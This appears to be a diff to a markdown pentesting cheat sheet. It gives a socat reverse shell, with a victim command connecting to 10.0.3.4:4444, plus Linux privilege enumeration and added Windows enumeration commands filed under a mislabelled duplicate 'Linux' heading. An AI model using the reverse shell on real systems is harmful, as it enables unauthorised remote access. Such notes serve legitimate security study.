@@ -25,6 +25,7 @@ export TERM=xterm
 stty raw -echo; fg
 ```
 ## Get reverse shell
+
 atk:
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -33,7 +34,8 @@ victim:
 ```
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-## Useful enumeration comands
+## Useful enumeration comands Linux
+
 List all processes runing as root
 ```
 ps -aux | grep root
@@ -46,6 +48,20 @@ List what can be run with higher privileges
 ```
 sudo -l
 ```
+## Useful enumeration comands Linux
+
+```
+net users
+```
+
+```
+systeminfo | findstr /B /C: "OS Name"/C: "OS Version"
+```
+
+```
+wmic service list
+```
+
 ## Usefull common Linux commands
 
 Make file executable
